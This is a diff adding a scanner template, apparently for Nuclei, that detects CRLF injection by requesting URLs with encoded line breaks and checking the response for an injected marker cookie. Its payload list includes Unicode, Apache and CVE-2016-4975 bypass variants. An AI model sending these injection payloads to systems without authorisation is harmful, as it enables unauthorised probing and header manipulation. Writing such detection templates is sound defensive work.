@@ -1,0 +1,28 @@
+id: crlf-injection
+
+info:
+  name: CRLF Injection Detection
+  author: melbadry9, nadino, xElkomy
+  severity: low
+  description: |
+    This template detects CRLF (Carriage Return Line Feed) injection vulnerabilities. Attackers may exploit these vulnerabilities to inject headers or manipulate server responses.
+  remediation: |
+    Properly sanitize user input and encode special characters to prevent CRLF injections. Use frameworks or libraries that automatically handle HTTP header encoding.
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=crlfinjection"    # Unicode bypass
+      - "{{BaseURL}}/%0DSet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%3F%0DSet-Cookie%3Acrlfinjection=crlfinjection"
+      - "{{BaseURL}}/%0ASet-Cookie%3Acrlfinjection/.."    # Apache bypass
+      - "{{BaseURL}}/~user/%0D%0ASet-Cookie:crlfinjection"    # CVE-2016-4975 bypass
+      - "{{BaseURL}}/?Page=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - '(?m)(?:Set-Cookie\s*?:.*?(crlfinjection=crlfinjection).*?$)'
